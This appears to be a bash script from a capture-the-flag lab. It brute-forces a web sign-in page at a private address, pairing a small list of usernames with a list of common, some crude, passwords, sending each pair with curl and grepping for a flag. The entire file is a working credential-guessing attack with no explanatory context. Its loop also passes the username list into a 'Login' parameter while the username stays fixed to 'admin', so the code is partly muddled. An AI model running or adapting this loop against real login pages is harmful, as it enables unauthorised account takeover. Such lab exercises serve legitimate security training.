USER=(root
admin
test
guest)
PASS=(123456
password
12345678
1234
pussy
12345
dragon
qwerty
696969
mustang
letmein
baseball
master
michael
football
shadow
monkey
abc123
pass
fuckme
6969
jordan
harley
ranger
iwantu
jennifer
hunter
fuck
2000
test
albert)

for i in ${USER[@]}
do
	for y in ${PASS[@]}
	do
		curl  http://192.168.56.105/\?page\=signin\&username\=admin\&password\=${y}\&Login\=${i}\# | grep flag
	done
done
